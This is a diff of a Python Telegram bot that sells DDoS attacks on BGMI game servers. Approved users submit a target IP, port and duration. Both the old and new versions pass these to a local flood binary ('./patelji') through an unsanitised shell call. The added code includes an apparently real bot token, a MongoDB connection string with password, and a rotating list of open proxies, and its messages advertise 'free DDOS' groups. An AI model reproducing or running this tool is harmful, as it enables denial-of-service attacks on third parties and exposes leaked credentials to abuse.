-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿
-@#/
-'''
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-import asyncio
+import os
+import telebot
 import json
+import requests
 import logging
 import time
-import signal
-from aiogram import Bot, Dispatcher
-from aiogram.types import Message
-from aiogram import filters
-import datetime
-import timedelta
-import os 
-import sys
+from pymongo import MongoClient
+from datetime import datetime, timedelta
+import certifi
+import random
+from subprocess import Popen
+from threading import Thread
+import asyncio
+import aiohttp
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
-logging.basicConfig(level=logging.INFO)
+loop = asyncio.get_event_loop()
 
+TOKEN = '7343868555:AAEmxTt6TEOceKCckEhRIJCy-R-5JIATR4c'
+MONGO_URI = 'mongodb+srv://admin:kpR4ObsewTySq48I@test.zeqrmgb.mongodb.net/test_db?retryWrites=true&w=majority&appName=piro&tlsAllowInvalidCertificates=true'
+FORWARD_CHANNEL_ID = -1007343868555
+CHANNEL_ID = -1007343868555
+error_channel_id = -1007343868555
 
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
+client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
+db = client['patelji']
+users_collection = db.users
 
+bot = telebot.TeleBot(TOKEN)
+REQUEST_INTERVAL = 1
 
-AUTHORIZED_USERS = {}
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
-def load_authorized_users():
-    global AUTHORIZED_USERS
+async def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    await start_asyncio_loop()
+
+def update_proxy():
+    proxy_list = [
+        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
+        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
+        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
+        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
+        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
+        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
+        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
+        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
+        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
+        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
+        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
+        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
+        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
+        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
+        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
+        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
+        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
+        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
+        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
+        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
+        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
+        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
+        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
+        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
+        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
+        "https://80.78.23.49:1080"
+    ]
+    proxy = random.choice(proxy_list)
+    telebot.apihelper.proxy = {'https': proxy}
+    logging.info("Proxy updated successfully.")
+
+@bot.message_handler(commands=['update_proxy'])
+def update_proxy_command(message):
+    chat_id = message.chat.id
     try:
-        with open("authorized_users.json", "r") as f:
-            users = json.load(f)
-            for user_id, user_data in users.items():
-                if isinstance(user_data, dict) and "authorized_until" in user_data:
-                    AUTHORIZED_USERS[int(user_id)] = {"authorized_until": datetime.datetime.fromtimestamp(user_data["authorized_until"])}
-                else:
-                    print(f"Warning: User {user_id} has no 'authorized_until' field in authorized_users.json")
-    except FileNotFoundError:
-        pass
+        update_proxy()
+        bot.send_message(chat_id, "Proxy updated successfully.")
+    except Exception as e:
+        bot.send_message(chat_id, f"Failed to update proxy: {e}")
 
-def save_authorized_users():
-    with open("authorized_users.json", "w") as f:
-        users = {str(user_id): {"authorized_until": user_data["authorized_until"].timestamp()} for user_id, user_data in AUTHORIZED_USERS.items()}
-        json.dump(users, f)
+async def start_asyncio_loop():
+    while True:
+        await asyncio.sleep(REQUEST_INTERVAL)
 
-load_authorized_users()
+async def run_attack_command_async(target_ip, target_port, duration):
+    process = await asyncio.create_subprocess_shell(f"./patelji {target_ip} {target_port} {duration} 60")
+    await process.communicate()
 
-
-async def check_authorization(user_id):
-    if user_id not in AUTHORIZED_USERS:
+def is_user_admin(user_id, chat_id):
+    try:
+        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
+    except:
         return False
-    user_data = AUTHORIZED_USERS[user_id]
-    if user_data["authorized_until"] < datetime.datetime.now():
-        del AUTHORIZED_USERS[user_id]
-        save_authorized_users()
-        return False
-    return True
 
-async def add_user(message: Message):
-    if message.from_user.id!= ADMIN_ID:
-        await message.answer("You're not Approved to use this Command DM:-@gazig4369")
-        return
-    args = message.text.split()[1:]
-    if len(args)!= 2:
-        await message.answer("Usage: /adduser <user_id> <authorization_period>")
-        return
-    user_id = int(args[0])
-    authorization_period = int(args[1])
-    AUTHORIZED_USERS[user_id] = {"authorized_until": datetime.datetime.now() + datetime.timedelta(minutes=authorization_period)}
-    save_authorized_users()
-    await message.answer(f"User {user_id} added with authorization period of {authorization_period} minutes.")
-
-async def remove_user(message: Message):
-    if message.from_user.id!= ADMIN_ID:
-        await message.answer("You're not Approved to use this Command DM:- @gazig4369")
-        return
-    args = message.text.split()[1:]
-    if len(args)!= 1:
-        await message.answer("Usage: /removeuser <user_id>")
-        return
-    user_id = int(args[0])
-    if user_id in AUTHORIZED_USERS:
-        del AUTHORIZED_USERS[user_id]
-        save_authorized_users()
-        await message.answer(f"User {user_id} removed.")
-    else:
-        await message.answer(f"User {user_id} not found.")
-
-async def update_user(message: Message):
-    if message.from_user.id!= ADMIN_ID:
-        await message.answer("You're not Approved to use this Command DM:- @gazig4369")
-        return
-    args = message.text.split()[1:]
-    if len(args)!= 2:
-        await message.answer("Usage: /updateuser <user_id> <new_authorization_period>")
-        return
-    user_id = int(args[0])
-    new_authorization_period = int(args[1])
-    if user_id in AUTHORIZED_USERS:
-        AUTHORIZED_USERS[user_id]["authorized_until"] = datetime.datetime.now() + datetime.timedelta(minutes=new_authorization_period)
-        save_authorized_users()
-        await message.answer(f"User {user_id} updated with new authorization period of {new_authorization_period} minutes.")
-    else:
-        await message.answer(f"User {user_id} not found.")
-
-async def list_users(message: Message):
-    if message.from_user.id!= ADMIN_ID:
-        await message.answer("You're not Approved to use this Command DM:- @gazig4369")
-        return
-    user_list = []
-    for user_id, user_data in AUTHORIZED_USERS.items():
-        user_list.append(f"{user_id} - Authorized until: {user_data['authorized_until']}")
-    await message.answer("Authorized users:\n" + "\n".join(user_list))
-
-async def broadcast(message: Message):
-    if message.from_user.id!= ADMIN_ID:
-        await message.answer("You're not Approved to use this Command DM:- @gazig4369")
-        return
-    text = message.text.split(maxsplit=1)[1]
-    for user_id in AUTHORIZED_USERS:
-        try:
-            await bot.send_message(user_id, text)
-        except Exception as e:
-            logging.error(f"Error sending message to user {user_id}: {e}")
-
-def save_authorized_users():
-    with open("authorized_users.json", "w") as f:
-        users = {str(user_id): {"authorized_until": user_data["authorized_until"].timestamp()} for user_id, user_data in AUTHORIZED_USERS.items()}
-        json.dump(users, f)
-
-async def restart_bot(message: Message):
-    if message.from_user.id!= ADMIN_ID:
-        await message.answer("You're not Approved to use this Command DM:- @gazig4369")
-        return
-    await message.answer("Restarting bot...")
-    save_authorized_users()
-    os.execl(sys.executable, sys.executable, *sys.argv)
-
-async def user_info(message: Message):
+@bot.message_handler(commands=['approve', 'disapprove'])
+def approve_or_disapprove_user(message):
     user_id = message.from_user.id
-    user_data = AUTHORIZED_USERS.get(user_id)
-    if user_data:
-        approval_expiry = user_data["authorized_until"]
-        if approval_expiry > datetime.datetime.now():
-            approval_expiry_str = approval_expiry.strftime("%Y-%m-%d %H:%M:%S")
-        else:
-            approval_expiry_str = "Not approved"
-    else:
-        approval_expiry_str = "𝙊𝙥𝙥𝙨 𝙉𝙤𝙩 𝙖𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 @gazig4369"
+    chat_id = message.chat.id
+    is_admin = is_user_admin(user_id, CHANNEL_ID)
+    cmd_parts = message.text.split()
 
-    username = message.from_user.username
+    if not is_admin:
+        bot.send_message(chat_id, '''*👻Abe @Patelji_47  se permission mang 👇🤦‍♂️
+    😊Sir,  ग्रुप में आप शामिल हों, मुफ़्त DDOS उपलब्ध है
+👇👇👇👇👇👇👇👇👇
+https://t.me/addlist/UmC4oH_JvggyNTA1
+https://t.me/addlist/UmC4oH_JvggyNTA1
 
-    
-attack_process = None
-last_attack_time = 0
-async def welcome_user(message: Message):
-    if not await check_authorization(message.from_user.id):
-        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @gazig4369 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨")
+
+ 🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  Invalid command format. Use  👇 /approve  <user_id>  <days>
+
+🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚👉 🆔 123456  day 499*''', parse_mode='Markdown')
         return
+
+    if len(cmd_parts) < 2:
+        bot.send_message(chat_id,'''*👻Abe @Patelji_47  se permission mang 👇🤦‍♂️
+    😊Sir,  ग्रुप में आप शामिल हों, मुफ़्त DDOS उपलब्ध है
+👇👇👇👇👇👇👇👇👇
+https://t.me/addlist/UmC4oH_JvggyNTA1
+https://t.me/addlist/UmC4oH_JvggyNTA1
+
+
+ 🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  Invalid command format. Use  👇 /approve  <user_id>  <days>
+
+🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚👉 🆔 123456  day 499*''', parse_mode='Markdown')
+        return
+
+    action = cmd_parts[0]
+    target_user_id = int(cmd_parts[1])
+    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
+    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
+
+    if action == '/approve':
+        if plan == 1:  
+            if users_collection.count_documents({"plan": 1}) >= 99:
+                bot.send_message(chat_id, "", parse_mode='Markdown')
+                return
+        elif plan == 2:  
+            if users_collection.count_documents({"plan": 2}) >= 499:
+                bot.send_message(chat_id, "", parse_mode='Markdown')
+                return
+
+        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f'''
+        Patel ji bot ne  aapko swikar kar liya 😅😅 
+        *@patelji_47 User {target_user_id} approved with plan {plan} for {days} days.*'''
+    else:  # disapprove
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
+
+    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
+    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
+@bot.message_handler(commands=['patelji'])
+def attack_command(message):
     user_id = message.from_user.id
-    user_data = AUTHORIZED_USERS.get(user_id)
-    if user_data:
-        approval_expiry = user_data["authorized_until"]
-        if approval_expiry > datetime.datetime.now():
-            approval_expiry_str = approval_expiry.strftime("%Y-%m-%d %H:%M:%S")
-        else:
-            approval_expiry_str = "Not approved"
-    else:
-        approval_expiry_str = "𝙊𝙥𝙥𝙨 𝙉𝙤𝙩 𝙖𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 @gazig4369"
+    chat_id = message.chat.id
 
-    username = message.from_user.username
-    await message.answer(f"🔖 𝙍𝙤𝙡𝙚: 𝙐𝙨𝙚𝙧\n")
-    await message.answer(f"𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝘽𝙂𝙈𝙄 𝘼𝙩𝙩𝙖𝙘𝙠 𝘽𝙤𝙩! 🚀\n\n"
+    try:
+        user_data = users_collection.find_one({"user_id": user_id})
+        if not user_data or user_data['plan'] == 0:
+            bot.send_message(chat_id,''' 😊Sir,  ग्रुप में आप शामिल हों, मुफ़्त DDOS उपलब्ध है
+👇👇👇👇👇👇👇👇👇
+https://t.me/addlist/UmC4oH_JvggyNTA1
+https://t.me/addlist/UmC4oH_JvggyNTA1
 
-                         f"𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙨 𝙮𝙤𝙪 𝙩𝙤 𝙡𝙖𝙪𝙣𝙘𝙝 𝙖 𝘽𝙂𝙈𝙄 𝙖𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 𝙖 𝙩𝙖𝙧𝙜𝙚𝙩 𝙄𝙋 𝙖𝙣𝙙 𝙥𝙤𝙧𝙩.\n\n" 
+ 🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  Invalid command format. Use  👇  /Patel_ji_please_add_me <user_id>  <days>
 
-                         f''' /patelji <target> <port> <time> <time>
-By  \n\n'''    
+🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚👉 🆔 123456  day 499 ''')
+            return
 
-                         f"𝙀𝙭𝙖𝙢𝙥𝙡𝙚:/patelji 20.235.94.237 17870 300 300\n\n"
-                         f"By  https://t.me/+a2kaW4rQh0ZhMzY9 \n\n"
+        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
+            bot.send_message(chat_id, "@patelji_47 .")
+            return
 
-f'''☠️ @gazig4369 ☠️:
+        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
+            bot.send_message(chat_id, "")
+            return
 
-{user_id}
-|{username}👇🏻|      
+        bot.send_message(chat_id, '''  <target> <port> <time>
+By @patelji_47*''')
+        bot.register_next_step_handler(message, process_attack_command)
+    except Exception as e:
+        logging.error(f"Error in attack command: {e}")
+
+@bot.message_handler(commands=['patelji'])
+def attack_command(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    try:
+        user_data = users_collection.find_one({"user_id": user_id})
+        if not user_data or user_data['plan'] == 0:
+            bot.send_message(chat_id, '''🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚   20.235.94.237 17870 180
+ <target> <port> <time>
+By @patelji_47*''', parse_mode='Markdown')
+            return
+
+        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
+            bot.send_message(chat_id, "*patelji is currently not available due to limit reached*", parse_mode='Markdown')
+            return
+
+        bot.send_message(chat_id, '''*🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚   20.235.94.237 17870 180
+<target> <port> <time>
+By @patelji_47*''', parse_mode='Markdown')
+        bot.register_next_step_handler(message, process_attack_command)
+    except Exception as e:
+        logging.error(f"Error in attack command: {e}")
+
+def process_attack_command(message):
+    try:
+        args = message.text.split()
+        if len(args) != 3:
+            bot.send_message(message.chat.id, "*Bahan ke laude sahi se dal. Please use: /patelji target_ip target_port duration*", parse_mode='Markdown')
+            return
+        target_ip, target_port, duration = args[0], int(args[1]), args[2]
+
+        if target_port in blocked_ports:
+            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
+            return
+
+        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
+        bot.send_message(message.chat.id, f'''*started 👻Aapki Yatra mangal ho 😅 \n
+|￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
+|Host: {target_ip}\n|Port: {target_port}\n|Time: {duration} ⠀⠀⠀| @patelji_47                      |
+|                                                                          
+|＿＿＿＿＿＿＿＿＿＿＿＿    ＿＿＿＿|
+(\__/) ||
+(•ㅅ•) ||
+/ 　 づ @patel_ji47
+
+
+😡Koi bhi feedback send nahin kar raha aage se kuchh nahin milega niche DM de raha hun feedback send karo 🫵
+                                           DM-  @patelji_47
+*''', parse_mode='Markdown')
+    except Exception as e:
+        logging.error(f"Error in processing attack command: {e}")
+
+def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(start_asyncio_loop())
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
+    btn2 = KeyboardButton("patelji")
+    btn3 = KeyboardButton("Canary Download💢")
+    markup.add(btn2, btn3,)
+
+    bot.send_message(message.chat.id, '''*By  https://t.me/patel_ji47   :
+☠️ PATELJI_47☠️
 ⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷   |😋bgmi😘|
+⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
 ⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
 ⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
 ⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
@@ -508,111 +274,74 @@ f'''☠️ @gazig4369 ☠️:
 ⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
 ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
 ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠘⣿⣿⣿
+⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
 ⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿ ''') 
-
-LAST_ATTACK_TIME = {}
-
-async def bgmi_attack(message: Message):
-    if not await check_authorization(message.from_user.id):
-        await message.answer('''𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙🖤\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @gazig4369 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨''')
-        return
-    if message.from_user.id not in AUTHORIZED_USERS:
-        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @gazig4369 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨‌.")
-        return
-
-    current_time = time.time()
-
-    if message.from_user.id in LAST_ATTACK_TIME and current_time - LAST_ATTACK_TIME[message.from_user.id] < 0:
-        remaining_seconds = 0 - (current_time - LAST_ATTACK_TIME[message.from_user.id])
-        minutes, seconds = divmod(remaining_seconds, 0)
-        time_str = f"{int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} "
-        await message.answer(f"𝙔𝙤𝙪 𝙢𝙪𝙨𝙩 𝙬𝙖𝙞𝙩 {time_str}. 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙨𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝙖𝙣𝙤𝙩𝙝𝙚𝙧 𝙖𝙩𝙩𝙖𝙘𝙠")
-        return
-
-    args = message.text.split()[1:]
-    if len(args) < 4:
-        await message.answer(" 🤦‍♂️𝙐𝙨𝙖𝙜𝙚: /patelji <target> <port> <time>  <time> \n\n 🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  / 20.235.94.237 17870 300 300")
-        return
-
-    ip, port, time_seconds, threads = args
-    command = f"./patelji {ip} {port} {time_seconds} {threads}"
-
-    LAST_ATTACK_TIME[message.from_user.id] = current_time
-
-    await message.answer(f'''😂 Bgmi ki gand maar Di gai hai Successfully   \n  🎯𝙄𝙋: {ip}\n 🏖️𝙋𝙤𝙧𝙩: {port}\n ⌚𝙏𝙞𝙢𝙚: {time_seconds} 𝙨𝙚𝙘.''')
+⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿*
     
-    try:
-        attack_process = await asyncio.create_subprocess_shell(
-            command,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
+  😊Sir,  ग्रुप में आप शामिल हों, मुफ़्त DDOS उपलब्ध है
+👇👇👇👇👇👇👇👇👇
+ https://t.me/addlist/UmC4oH_JvggyNTA1
+                     
+ https://t.me/addlist/UmC4oH_JvggyNTA1
+''', reply_markup=markup, parse_mode='Markdown')
 
-        stdout, stderr = await attack_process.communicate()
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    if message.text == "":
+        bot.reply_to(message, "*", parse_mode='Markdown')
+    elif message.text == "patelji":
+        bot.reply_to(message, ''''*  😊Sir,  ग्रुप में आप शामिल हों, मुफ़्त DDOS उपलब्ध है
+👇👇👇👇👇👇👇👇👇
+ https://t.me/addlist/UmC4oHJvggyNTA1
+  ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁                    
+ https://t.me/addlist/UmC4oHJvggyNTA1
+ कृपया Attack करने के लिए तैयार हैं Please
+*👻Abe @Patelji_47  se permission mang 👇🤦‍♂️
+    😊Sir,  ग्रुप में आप शामिल हों, मुफ़्त DDOS उपलब्ध है
+👇👇👇👇👇👇👇👇👇
+https://t.me/addlist/UmC4oH_JvggyNTA1
+https://t.me/addlist/UmC4oH_JvggyNTA1
 
-        response = f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 ☄️ {ip}:{port} \n 🎉𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🎊𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮🥳"
-        if stdout:
-            response += f"\nOutput:\n{stdout.decode()}"
-        if stderr:
-            response += f"\nErrors:\n{stderr.decode()}"
 
-        await message.answer(response)
+ 🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  Invalid command format. Use  👇 /approve  <user_id>  <days>
 
-    except Exception as e:
-        await message.answer(f"Error: {e}")
-
-async def bgmi_stop(message: Message):
-    if not await check_authorization(message.from_user.id):
-        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @gazig4369 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨")
-        return
-    if message.from_user.id not in AUTHORIZED_USERS:
-        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 ??𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @gazig4369 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨‌.")
